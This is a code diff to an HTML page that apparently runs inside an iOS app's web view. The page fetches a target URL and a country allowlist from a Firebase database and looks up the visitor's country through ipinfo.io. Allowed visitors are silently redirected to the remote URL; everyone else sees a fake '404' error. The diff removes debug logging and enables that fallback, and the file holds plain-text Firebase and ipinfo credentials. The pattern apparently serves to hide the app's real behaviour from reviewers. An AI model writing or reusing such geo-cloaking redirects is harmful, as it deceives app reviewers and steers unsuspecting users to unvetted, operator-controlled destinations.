@@ -11,9 +11,6 @@
     import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
     import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-analytics.js";
     import { getDatabase, ref, get } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";
-
-    console.log("[STEP 1] Импортированы Firebase модули");
-
     const firebaseConfig = {
       apiKey: "AIzaSyA555FEe6mqBNGISndTf-63gUSGTCrg5uw",
       authDomain: "kangoo-30ec7.firebaseapp.com",
@@ -24,52 +21,29 @@
       appId: "1:308162323926:web:b90751b91f164a0a6f3077",
       measurementId: "G-NSXRZEHBMB"
     };
-
-    console.log("[STEP 2] Firebase config инициализируется");
-
     const app = initializeApp(firebaseConfig);
     const analytics = getAnalytics(app);
     const bd = getDatabase(app);
-
-    console.log("[STEP 3] Firebase инициализирован");
-
     let allowedCountries = [];
     const dbRef = ref(bd);
     var wrl = "";
     var rg = "";
-
-    console.log("[STEP 4] Получение данных из Firebase");
-
     get(dbRef)
       .then((snapshot) => {
-        console.log("[STEP 5] Firebase ответ получен");
-
         if (snapshot.exists()) {
           const val = snapshot.val();
-          console.log("[STEP 6] Данные из Firebase:", val);
-
           wrl = val.data;
           rg = val.rg;
           allowedCountries = rg.split(' ');
-
-          console.log("[STEP 7] URL из базы:", wrl);
-          console.log("[STEP 8] Разрешённые страны:", allowedCountries);
-
           if (!wrl || allowedCountries.length === 0) {
-            console.warn("[WARNING] Отсутствует URL или список стран");
             ErorDebuger();
             return;
           }
-
-          console.log("[STEP 9] Отправка запроса на ipinfo.io");
           fetch('https://ipinfo.io/json?token=7519bf9ad9f5eb')
             .then(response => response.json())
             .then(data => {
-              console.log("[STEP 10] Ответ от ipinfo.io:", data);
-
               const country = data.country;
               if (!country) {
-                console.warn("[ERROR] Не удалось получить страну из IP данных");
                 ErorDebuger();
                 return;
               }
@@ -77,27 +51,22 @@
               console.log("[STEP 11] Страна пользователя:", country);
 
               if (allowedCountries.includes(country)) {
-                console.log("[STEP 12] Страна разрешена, перенаправление на:", wrl);
                 window.webkit.messageHandlers.jsHandler.postMessage("skip_404");
                 window.location.replace(wrl);
                 return;
               } else {
-                console.warn("[STEP 13] Страна не входит в список разрешённых");
                 ErorDebuger();
               }
             })
             .catch(err => {
-              console.error("[ERROR] Ошибка при получении данных IP:", err);
               ErorDebuger();
             });
 
         } else {
-          console.warn("[ERROR] Snapshot из Firebase не содержит данных");
           ErorDebuger();
         }
       })
       .catch((error) => {
-        console.error("[ERROR] Ошибка при получении данных из Firebase:", error);
         ErorDebuger();
       });
 
@@ -107,12 +76,10 @@
       if (window.webkit?.messageHandlers?.jsHandler) {
         console.log("[DEBUG] Отправка сообщения в WebKit: error_404");
         window.webkit.messageHandlers.jsHandler.postMessage("error_404");
-      } else {
-        console.warn("[WARNING] WebKit handler не доступен");
       }
-
-      // window.location.href = "404.json";
+       window.location.href = "404.json";
     }
   </script>
 </body>
 </html>
+
